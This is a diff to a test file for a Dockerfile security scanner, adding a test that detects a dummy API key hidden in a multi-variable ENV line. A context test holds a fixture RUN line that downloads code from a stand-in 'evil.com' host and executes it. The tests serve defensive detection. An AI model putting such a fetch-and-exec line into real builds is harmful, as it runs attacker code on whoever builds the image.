@@ -289,3 +289,12 @@ def test_python_inline_remote_exec(tmp_path):
     df.write_text('FROM python:3.12\nRUN python -c "import urllib.request; exec(urllib.request.urlopen(\'https://evil.com\').read())"\nUSER app\n')
     findings = scan_dockerfile(str(df))
     assert any(f.rule == "curl-pipe-shell" for f in findings)
+
+
+def test_multi_var_env_secret_hidden(tmp_path):
+    """Secret hidden in second variable of multi-var ENV."""
+    from vibefort.dockerscan import scan_dockerfile
+    df = tmp_path / "Dockerfile"
+    df.write_text('FROM python:3.12\nENV APP_NAME=myapp API_KEY=sk1234567890abcdef\nUSER app\n')
+    findings = scan_dockerfile(str(df))
+    assert any(f.rule == "secret-in-env" for f in findings)
